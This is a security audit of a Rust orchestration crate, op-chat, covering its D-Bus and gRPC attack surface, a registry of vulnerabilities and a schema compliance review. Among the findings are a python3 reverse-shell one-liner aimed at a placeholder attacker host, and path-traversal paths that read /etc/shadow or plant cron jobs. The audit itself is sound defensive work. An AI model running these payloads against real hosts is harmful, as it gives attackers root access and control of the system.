# Production Security & Quality Audit: op-chat

## 1. D-Bus & IPC Attack Surface Audit

The `op-chat` crate operates both as a client interacting with system D-Bus services (such as `systemd1`) and exposes highly privileged internal orchestrator controls via a gRPC interface.

### Connection Architecture
*   **Bus Type:** Connects exclusively to the **System Bus** via `zbus::Connection::system().await?` (as referenced in `crates/op-chat/src/tool_loader.rs:705`).
*   **Incoming IPC/RPC Interface:** Exposes unauthenticated gRPC endpoints on port `50052` (defined in `crates/op-chat/src/main.rs:17`) mapped to the `op_chat.orchestration` Protobuf package.

### Target D-Bus Interfaces & Methods Utilized
These outgoing client-side method calls are initiated by `op-chat` on the system bus on behalf of the orchestration tools:

| Target D-Bus Interface | Object Path | Method Called | Location in Source | Caller Identity Check? |
| :--- | :--- | :--- | :--- | :--- |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `GetUnit` | `crates/op-chat/src/tool_loader.rs:723` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `ListUnits` | `crates/op-chat/src/tool_loader.rs:810` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `StartUnit` | `crates/op-chat/src/tool_loader.rs:855` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `StopUnit` | `crates/op-chat/src/tool_loader.rs:900` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `RestartUnit` | `crates/op-chat/src/tool_loader.rs:943` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `EnableUnitFiles` | `crates/op-chat/src/tool_loader.rs:986` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `DisableUnitFiles` | `crates/op-chat/src/tool_loader.rs:1029` | **None** |
| `org.freedesktop.systemd1.Manager` | `/org/freedesktop/systemd1` | `Reload` | `crates/op-chat/src/tool_loader.rs:1070` | **None** |

### Stub/Target Simulated Interfaces
In `crates/op-chat/src/orchestration/dbus_orchestrator.rs:25`, the codebase defines configuration for a target D-Bus orchestrator manager:
*   **Interface name:** `com.system.orchestrator.Manager`
*   **Object path:** `/com/system/orchestrator/Manager`
*   **Simulated Mutating Methods:** `spawn_agent` (line 188), `stop_agent` (line 219), `restart_agent` (line 233), `send_to_agent` (line 291). None of these simulated methods contain any caller authentication checks.

---

## 2. Security & Quality Vulnerability Registry

### [CRITICAL] Privilege Escalation & Security Boundary Bypass via Unauthenticated Systemd D-Bus proxy calls
*   **File/Line Citation:** `crates/op-chat/src/tool_loader.rs:855`, `crates/op-chat/src/tool_loader.rs:900`, `crates/op-chat/src/tool_loader.rs:943`
*   **Vulnerability Type:** Privilege Escalation / Auth Bypass
*   **Description:** `op-chat` connects to the system bus as a privileged system process (typically running as `root` to enable Open vSwitch configuration and netdev/kernel level operations). When the gRPC/RPC interface receives commands to execute tools like `systemd_start_unit`, `systemd_stop_unit`, or `systemd_restart_unit`, it forwards these calls to `zbus::Connection::system()` without authenticating the requesting client or applying Polkit identity mapping. 
*   **Exploitation Scenario:** An attacker on the network connects to the exposed unauthenticated gRPC port (`50052`) and calls the `execute` method with `agent_id = "systemd"` and `operation = "start_unit"`. The `op-chat` server receives the message and sends a D-Bus request to the system bus. Systemd sees the D-Bus request originating from `op-chat` (UID 0 / root) and executes the service start/stop without prompting the attacker for authentication, completely bypassing polkit controls.

---

### [CRITICAL] Unauthenticated & Unencrypted gRPC Port Exposure Exposing System Control Plane
*   **File/Line Citation:** `crates/op-chat/src/orchestration/services/mod.rs:136`, `crates/op-chat/src/main.rs:17`
*   **Vulnerability Type:** Missing Authentication / Missing Encryption
*   **Description:** The orchestration gRPC server is bound to `0.0.0.0:50052` (or from `OP_CHAT_LISTEN`) and initialized via `tonic::transport::Server::builder().serve(addr).await`. There are no authentication interceptors, tokens, or TLS/mTLS configurations present. 
*   **Exploitation Scenario:** Anyone on the local network (or the public internet if the port is exposed) can connect directly to the control port and execute arbitrary gRPC calls defined in `op_chat.orchestration`. This includes writing system context files, starting build processes, and triggering agents to perform privileged operations on the host.

---

### [CRITICAL] Path Traversal in File Read/Write Operations Bypassing Sandbox Checks
*   **File/Line Citation:** `crates/op-chat/src/tool_loader.rs:411`, `crates/op-chat/src/tool_loader.rs:485`
*   **Vulnerability Type:** Path Traversal (Arbitrary File Read/Write)
*   **Description:**
    *   In `ReadFileTool`, the path check relies on `path.starts_with(p)` to block sensitive files `/etc/shadow` and `/etc/sudoers`.
    *   In `WriteFileTool`, the path check relies on `path.starts_with(p)` to block system directories `["/etc/", "/boot/", "/sys/", "/proc/"]`.
    These checks can be bypassed using directory traversal patterns (e.g. `/tmp/../etc/shadow` or `/var/tmp/../../etc/cron.d/exploit`). Additionally, since the home directories are not blacklisted, an attacker can overwrite `/home/user/.ssh/authorized_keys` directly.
*   **Exploitation Scenario:** An attacker executes the `write_file` tool with arguments `path = "/var/tmp/../../etc/cron.d/malicious"` and injects a cron job script. Because the path does not start with `/etc/`, the security filter passes. The file is written to the host filesystem, resulting in arbitrary code execution as root.

---

### [CRITICAL] Sandbox Escape via Permissive Shell Command Whitelist
*   **File/Line Citation:** `crates/op-chat/src/tool_loader.rs:592` (relative to whitelist definition at `crates/op-chat/src/tool_loader.rs:534`)
*   **Vulnerability Type:** Command Injection / Sandbox Escape
*   **Description:** `ShellExecuteTool` checks if the commanded binary is whitelisted in `allowed_commands`. However, the whitelist includes highly powerful languages and system utilities including `python3`, `cargo`, `docker`, and `git`.
*   **Exploitation Scenario:** An attacker requests execution of `python3` with arguments `["-c", "import os; os.system('bash -i >& /dev/tcp/attacker_ip/4444 0>&1')"]`. Because `python3` is whitelisted, `op-chat` spawns the subprocess, returning a root-privileged reverse shell to the attacker.

---

### [HIGH] Deserialization of Unvalidated Caller-Supplied JSON Payload
*   **File/Line Citation:** `crates/op-chat/src/orchestration/services/agent_execution.rs:40`
*   **Vulnerability Type:** Untrusted Deserialization / Injection
*   **Description:** The gRPC service `AgentExecution::execute` takes `arguments_json` as an unvalidated raw string and parses it using `simd_json::from_slice::<simd_json::OwnedValue>(&mut json_bytes)`. There is no schema validation or type-safety constraint applied before executing.
*   **Exploitation Scenario:** If the downstream agent expected structured numerical inputs but received unexpected polymorphic JSON shapes (arrays where objects are expected, large integers, or deeply nested JSON), this can trigger panic/unwind or excessive memory allocation, causing a Denial of Service.

---

## 3. Schema-as-Code Compliance Review

The system represents a hybrid state: it contains some protobuf definitions under `crates/op-chat/src/orchestration/proto/op_chat.orchestration.rs`, but much of the core metadata, tool definitions, configuration parameters, and LLM payloads bypass schema compilation, relying instead on ad-hoc structs and unstructured JSON-serializable containers (`simd_json::OwnedValue`).

### Schema-as-Code Violations
1.  **Ad-Hoc Message Exchange Structures:**
    *   `RpcRequest` (`crates/op-chat/src/actor.rs:59`) and `RpcResponse` (`crates/op-chat/src/actor.rs:125`) are defined as ad-hoc Rust structs with generic Serde attributes rather than versioned Protobuf models.
2.  **Generic Metadata Dictionaries:**
    *   The `ChatSession` metadata (`crates/op-chat/src/session.rs:13`) is defined as `HashMap<String, simd_json::OwnedValue>`. Dynamic key-value mappings of polymorphic data structures violate schema discipline.
3.  **Ad-Hoc Tool Parameters & Interface Declarations:**
    *   Tool input schemas (e.g. `RespondToUserTool::input_schema` at `crates/op-chat/src/tool_loader.rs:164`) are built inline as raw JSON schema values via the `json!` macro rather than compiled via versioned schemas or OSCAL component profiles.
    *   `Workstack` input and output schemas (`crates/op-chat/src/orchestration/workstacks.rs:142`) are also declared using ad-hoc `simd_json::OwnedValue` elements.
4.  **Ad-Hoc Orchestrator and Agent Lifecycle Models:**
    *   `AgentTask` and `TaskResult` (`crates/op-chat/src/orchestration/coordinator.rs:40,84`) use ad-hoc serializable models with untyped JSON payloads.
    *   `OrchestratorConfig` (`crates/op-chat/src/orchestration/dbus_orchestrator.rs:13`) is defined as an ad-hoc struct rather than being synchronized with an authoritative system topology model or OSCAL profile.